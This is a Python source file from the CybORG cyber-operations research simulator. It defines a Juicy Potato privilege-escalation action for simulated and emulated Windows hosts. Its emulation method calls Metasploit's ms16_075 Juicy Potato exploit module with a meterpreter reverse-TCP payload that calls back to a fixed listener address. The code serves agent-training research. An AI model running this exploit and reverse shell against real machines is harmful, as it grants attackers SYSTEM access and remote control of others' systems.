## The following code contains work of the United States Government and is not subject to domestic copyright protection under 17 USC § 105.
## Additionally, we waive copyright and related rights in the utilized code worldwide through the CC0 1.0 Universal public domain dedication.

"""
pertaining to the Juicy Potato permissions escalation action
"""
# pylint: disable=invalid-name
from typing import Tuple
from ipaddress import IPv4Address

from CybORG.Shared import Observation
from CybORG.Shared.Actions.MSFActionsFolder.MSFPrivilegeEscalationFolder.MSFPrivilegeEscalation import MSFPrivilegeEscalation
from CybORG.Shared.Enums import OperatingSystemType
from CybORG.Simulator.Host import Host
from CybORG.Simulator.Process import Process
from CybORG.Simulator.State import State


class MSFJuicyPotato(MSFPrivilegeEscalation):
    """
    Implements the Juicy Potato permissions escalation action
    Removes target session as Action parameters
    """
    def __init__(self, session: int, agent: str, ip_address: IPv4Address):
        super().__init__(session, agent)
        self.ip_address = ip_address

    def sim_execute(self, state: State) -> Observation:
        # find session on the chosen host
        hostname = state.ip_addresses[self.ip_address]
        sessions = [s for s in state.sessions[self.agent].values() if s.host == hostname]
        print("sessions on the target host")
        print(sessions)
        if len(sessions) == 0:
            # no valid session could be found on chosen host
            return Observation(success=False)

        target_host_session = None
        obs = Observation(False)
        for sess in sessions:
                # this will assume 1 non-priv sesssion on the host
                # otherwise it will return the last processed
                target_host_session = sess
                # find if this target_session is already SYSTEM or root
                if sess.username in ('root', 'SYSTEM'):
                   obs.set_success(True)
                   obs.add_session_info(hostid=hostname, **sess.get_state())
                   return obs

        # target session is not on the host.
        if target_host_session is None:
            return obs

        # if session in sandboxed (ie decoy sessions used by blue agent), the escalation fails
        # and the session is removed from the target
        if target_host_session.is_escalate_sandbox:
               state.remove_process(target_host_session.host, target_host_session.pid)
               return Observation(success=False), -1

        else:
               obs=self.sim_escalate(state, hostname, sess, "SYSTEM")

        return obs

    def emu_execute(self, session_handler) -> Observation:
        obs = Observation()
        from CybORG.Emulator.Session import MSFSessionHandler
        if type(session_handler) is not MSFSessionHandler:
            obs.set_success(False)
            return obs

        sessions = session_handler.get_session_by_remote_ip(str(self.ip_address), session_type="meterpreter")
        print(sessions)
        if len(sessions) == 0:
            obs.set_success(False)
            return obs
        session = list(sessions.keys())[0]
        output = session_handler.execute_module(mtype='exploit', mname='windows/local/ms16_075_reflection_juicy', opts={'RHOSTS': str(self.ip_address), 'SESSION': session}, payload_name='windows/x64/meterpreter/reverse_tcp', payload_opts={'LHOST': "10.46.64.10", 'LPORT': 4445})
        obs.add_raw_obs(output)
        obs.set_success(False)
        session_handler._log_debug(output)
        """
        example output
        """
        for line in output.split('\n'):
          print(line)
        obs.set_success(True)
        return obs

    def test_exploit_works(self, target_host: Host) ->\
            Tuple[bool, Tuple[Process, ...]]:
        # the exact patches and OS distributions are described here:
        # returns an empty list of escalatable processes
        return target_host.os_type == OperatingSystemType.WINDOWS, ()

    def __str__(self):
        return f"{self.__class__.__name__} Target: {self.ip_address}"

